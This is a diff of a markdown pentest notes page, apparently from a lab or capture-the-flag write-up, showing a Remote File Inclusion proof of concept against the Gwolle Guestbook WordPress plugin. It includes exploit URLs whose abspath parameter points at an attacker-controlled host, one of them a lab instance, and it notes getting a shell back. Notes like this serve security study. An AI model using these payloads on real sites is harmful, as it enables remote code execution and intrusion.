@@ -2,11 +2,11 @@
 
 ## allow\_include\_url enabled
 
-### Remote File Inclusion POC 
+### Remote File Inclusion POC&#x20;
 
-* Gwolle Guestbook WordPress Plugin \(allow\_include\_url is enable ...\)
+* Gwolle Guestbook WordPress Plugin (allow\_include\_url is enable ...)
 
-[http://\[host\]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://\[hackers\_website](http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website)\]
+http://\[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://\[hackers\_website]
 
 [http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.16.89/test](http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.16.89/test)
 
@@ -23,4 +23,3 @@
 * And get a shell back :
 
 ![](../../../../.gitbook/assets/8f91ebcb7a024ac9ad3c99a7928e17d6.png)
-
